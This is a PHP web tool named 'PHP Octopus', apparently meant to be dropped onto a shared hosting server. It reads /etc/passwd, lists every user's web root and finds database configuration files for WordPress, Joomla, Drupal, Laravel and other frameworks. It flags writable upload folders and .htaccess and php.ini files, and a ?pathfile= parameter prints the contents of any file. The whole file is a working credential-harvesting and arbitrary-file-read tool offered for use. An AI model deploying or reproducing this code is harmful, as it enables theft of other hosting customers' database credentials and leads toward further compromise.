<?php
/**
 * Created by PhpStorm.
 * User: lenon
 * Date: 27/08/16
 * Time: 14:44
 */


if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
    $myfile = fopen($_GET['pathfile'], "r") or die("Unable to open file!");
    echo '<pre>'.htmlspecialchars(fread($myfile,filesize($_GET['pathfile']))).'<pre>';
    fclose($myfile);
    exit();
}
?>
<html>
<head>
    <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
    <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
    <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
    <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
    <script type="application/javascript">
        $(document).ready(function() {
            $('#table').DataTable();
            $('#table').on( 'draw.dt', function () {
                $('.modalasz').click(function () {
                    console.log('click');
                    if($(this).attr('data-path')!=""){
                        $.get("?pathfile="+$(this).attr('data-path'), function(data) {
                            $('#myModal').html(data);
                        });
                    }else{
                        $('#myModal').html("folder with permission writter");
                    }

                    $('#myModal').dialog({
                        width: 1000
                    });
                });
            });
        } );
    </script>
    <style>
        #myModal{
            background: black;
            color: #fff;
        }
    </style>
</head>
<body>

<h1>PHP Octopus</h1>
<?php

if(@file('/etc/passwd')){
$users = file('/etc/passwd');

    $count['pathindex']=0;
    $count['pathpublicwritter']=0;
    $count['folderDefault']=0;
    $count['pathconfd6']=0;
    $count['pathconfd7']=0;
    $count['pathWriterJoo']=0;
    $count['pathWriterWp']=0;
    $count['pathVb']=0;
    $count['pathJoo']=0;
    $count['pathWp']=0;
    $count['pathLaravel']=0;
    $count['pathCodeigniter']=0;
    $count['pathSymfony']=0;
    $count['pathZend']=0;
    $count['pathhtaccess']=0;
    $count['pathphpini']=0;
    $total=0;
?>
<table id="table" class="display" cellspacing="0" width="100%">
    <thead>
    <tr>
        <th>
            id
        </th>
        <th>
            user
        </th>
        <th>
            index.php
        </th>
        <th>
            public writter
        </th>
        <th>
            Default
        </th>
        <th>
            Drupal 6
        </th>
        <th>
            Drupal 7
        </th>
        <th>
            write joom up
        </th>
        <th>
            write wp up
        </th>
        <th>
            vb
        </th>
        <th>
            joo
        </th>
        <th>
            wp
        </th>
        <th>
            laravel
        </th>
        <th>
            codeigniter
        </th>
        <th>
            symfony
        </th>
        <th>
            zend
        </th>
        <th>
            htaccess
        </th>
        <th>
            php.ini
        </th>
    </tr>
    </thead>
    <tfoot>
    <tr>
        <th>
            id
        </th>
        <th>
            user
        </th>
        <th>
            public writter
        </th>
        <th>
            index.php
        </th>
        <th>
            Default
        </th>
        <th>
            Drupal 6
        </th>
        <th>
            Drupal 7
        </th>
        <th>
            write joom up
        </th>
        <th>
            write wp up
        </th>
        <th>
            vb
        </th>
        <th>
            joo
        </th>
        <th>
            wp
        </th>
        <th>
            laravel
        </th>
        <th>
            codeigniter
        </th>
        <th>
            symfony
        </th>
        <th>
            zend
        </th>
        <th>
            htaccess
        </th>
        <th>
            php.ini
        </th>
    </tr>
    </tfoot>
    <tbody align="center">
    <?php
    $homes[]="home";
    $homes[]="home1";
    $homes[]="home2";
    $homes[]="home3";
    $homes[]="home4";
    $homes[]="home5";


    $public_folders[]="www";
    $public_folders[]="public_html";



    foreach($homes as $keyHome=>$home) {
        foreach($users as $key=> $user) {
            if ((is_dir('/' . $home . '/' . $userfinal[0] . '/' . $public_folders[0] . '/'))&&
                (is_dir('/' . $home . '/' . $userfinal[0] . '/' . $public_folders[1] . '/')) ){
                unset($public_folders[1]);
            }
            foreach($public_folders as $public_folder) {

                $userfinal = explode(':', $user);
                if (is_dir('/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/')) {
                    ?>

                    <tr>
                        <td>
                            <?php echo $key; ?>
                        </td>
                        <td>
                            <?php echo $userfinal[0]; ?>
                        </td>
                        <td>
                            <?php
                            $pathindex = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/index.php';
                            if (file_exists($pathindex)) {
                                $count['pathindex']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            if (is_writable($pathindex)) {
                                echo "w";
                                $count['pathindex']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>
                        <td>
                            <?php
                            $pathpublicwritter = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/';
                            if (is_writable($pathpublicwritter)) {
                                echo "w";
                                $count['pathpublicwritter']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz"
                                   data-path="<?php echo $pathpublicwritter; ?>" href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>
                        <td>
                            <?php
                            unset($url);

                            $url = array();
                            $folderDefaults = array();
                            $folderDefaults[] = "";
                            $folderDefaults[] = "includes/";
                            $folderDefaults[] = "include/";
                            $folderDefaults[] = "config/";
                            $folderDefaults[] = "configs/";
                            $folderDefaults[] = "common/";
                            $folderDefaults[] = "site/";
                            foreach ($folderDefaults as $keyFolder => $folderDefault) {
                                if ($keyFolder != 0) {
                                    $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'configuration.php';
                                }
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'application.ini';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'config.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'database.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conexao.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'connection.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conectar.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conecta.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'db.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'bd.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'con.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conn.php';
                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'configuracao.php';
                            }

                            $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/app/config/database.yml';
                            $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/app/config/config.yml';
                            $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/app/config/parameters.yml';

                            foreach ($url as $u) {

                                if (file_exists($u)) {
                                    $count['folderDefault']++;

                                    ?>
                                    <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" href="#">
                                        &#10004;
                                    </a>
                                    <?php
                                }
                            }

                            ?>
                        </td>
                        <td>
                            <?php
                            $pathconfd6 = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/sites/default/default.settings.php';
                            if (file_exists($pathconfd6)) {
                                $count['pathconfd6']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd6; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>
                        <td>
                            <?php
                            $pathconfd7 = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/sites/default/settings.php';
                            if (file_exists($pathconfd7)) {
                                $count['pathconfd7']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd7; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>
                        <td>
                            <?php
                            if ((is_writable('/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/images/')) OR (is_writable('/home/' . $userfinal[0] . '/'.$public_folder.'/tmp/'))) {
                                echo "w";
                                $count['pathWriterJoo']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>
                        <td>
                            <?php
                            if (is_writable('/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/wp-content/uploads/')) {
                                echo "w";
                                $count['pathWriterWp']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>
                        </td>

                        <td>
                            <?php
                            $pathconfvb = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/core/includes/config.php';
                            if (file_exists($pathconfvb)) {
                                $count['pathVb']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfvb; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathconfjoom = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/configuration.php';
                            if (file_exists($pathconfjoom)) {
                                $count['pathJoo']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfjoom; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathwpconfig = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/wp-config.php';
                            if (file_exists($pathwpconfig)) {
                                $count['pathWp']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathwpconfig; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathlaravel = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/config/database.php';
                            if (file_exists($pathlaravel)) {
                                $count['pathLaravel']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathlaravel; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathcodeigniter = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/application/config/database.php';
                            if (file_exists($pathcodeigniter)) {
                                $count['pathCodeigniter']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathcodeigniter; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathsymfony = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/app/config/parameters.yml';
                            if (file_exists($pathsymfony)) {
                                $count['pathSymfony']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathsymfony; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathzend = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/application/config/application.ini';
                            if (file_exists($pathzend)) {
                                $count['pathZend']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathzend; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathhtaccess = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/.htaccess';
                            if (file_exists($pathhtaccess)) {
                                echo "r";
                                $count['pathhtaccess']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            if (is_writable($pathhtaccess)) {
                                echo "w";
                                $count['pathhtaccess']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                        <td>
                            <?php
                            $pathphpini = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/php.ini';
                            if (file_exists($pathphpini)) {
                                $count['pathphpini']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            if (is_writable($pathphpini)) {
                                $count['pathphpini']++;
                                ?>
                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
                                   href="#">
                                    &#10004;
                                </a>
                                <?php
                            }
                            ?>

                        </td>
                    </tr>

                    <?php
                }
            }
        }
    }
    ?>
    </tbody>
    <?php
    }
    ?>

</table>
<fieldset id="bodyTitle">
    <legend>Total Detail</legend>
    <ul id="listOfTotalDetail">

        <li>
            Total of <?php echo $count['pathindex']; ?> files index.php for read
        </li>
        <li>
            Total of <?php echo $count['pathpublicwritter']; ?> folder public root for writer
        </li>
        <li>
            Total of <?php echo $count['folderDefault']; ?> files default config database read
        </li>
        <li>
            Total of <?php echo $count['pathconfd6']; ?> drupal 6 config database read
        </li>
        <li>
            Total of <?php echo $count['pathconfd7']; ?>  drupal 7 config database read
        </li>
        <li>
            Total of <?php echo $count['pathWriterJoo']; ?> folder of writer in joomla
        </li>
        <li>
            Total of <?php echo $count['pathWriterWp']; ?> folder of writer in WordPress
        </li>
        <li>
            Total of <?php echo $count['pathVb']; ?> vBulletin  config database read
        </li>
        <li>
            Total of <?php echo $count['pathJoo']; ?> joomla  config database read
        </li>
        <li>
            Total of <?php echo $count['pathWp']; ?> WordPress config database read
        </li>
        <li>
            Total of <?php echo $count['pathLaravel']; ?> Laravel config database read
        </li>
        <li>
            Total of <?php echo $count['pathCodeigniter']; ?> Codeigniter config database read
        </li>
        <li>
            Total of <?php echo $count['pathSymfony']; ?> Symfony config database read
        </li>
        <li>
            Total of <?php echo $count['pathZend']; ?> Zend config database read
        </li>
        <li>
            Total of <?php echo $count['pathhtaccess']; ?> htaccees read
        </li>
        <li>
            Total of <?php echo $count['pathphpini']; ?> php.ini read
        </li>
        <li>
            <h3>Total of
            <?php foreach($count as $c){
                $total+=$c;
            }
            echo $total;
            ?>

            find sensibles files
                </h3>

        </li>
    </ul>
</fieldset>
<!-- Modal -->
<div id="myModal" role="dialog">

</div>

</body>
</html>
